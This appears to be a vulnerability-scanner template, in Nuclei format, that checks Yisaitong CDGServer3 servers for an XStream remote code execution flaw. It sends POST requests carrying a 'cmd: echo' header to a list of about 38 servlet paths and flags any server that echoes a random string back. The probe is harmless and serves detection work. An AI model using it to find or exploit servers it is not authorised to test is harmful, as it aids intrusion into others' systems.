id: yisaitong-xstream-rce

info:
  name: yisaitong-xstream-rce
  author: msk
  severity: high



http:
  - raw:
      - |
        POST /CDGServer3/{{path}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.8
        Connection: close
        Content-Type: text/xml
        cmd: echo {{randstr}}

        

    payloads:

      path:
        - DecryptionApp
        - outgoingServlet
        - docRenewApp
        - PrintLimitApp
        - offlineApp
        - OutgoingRestoreApp
        - permissionApp
        - MailApp
        - FileAuditService
        - MailMessageLogServices
        - clientMessage
        - FileCountService
        - DecryPermissApp
        - PrintAuditService
        - EmailAuditService
        - ODMSubmitApplyService
        - UpdateClientStatus
        - UpgradeService1
        - GetValidateAuthCodeService
        - UserLoginOutService1
        - GetUserSafetyPolicyService
        - GetMakeOutSendFileInfoService
        - UpgradeService2
        - UpdatePasswordService
        - GetValidateLoginUserService
        - GetUsecPolicyService
        - GetValidateServerService
        - UninstallApplicationService1
        - OfflineApplicationService2
        - DecryptApplicationService1
        - document
        - AutoSignService1
        - CDGAuthoriseTempletService1
        - CreateDocService1
        - GetValidateLoginUserService
        - SecureUsbConnection
        - ExamCDGDocService1
        - SystemService


    matchers:
      - type: dsl
        dsl:
          - contains_all(body,"{{randstr}}")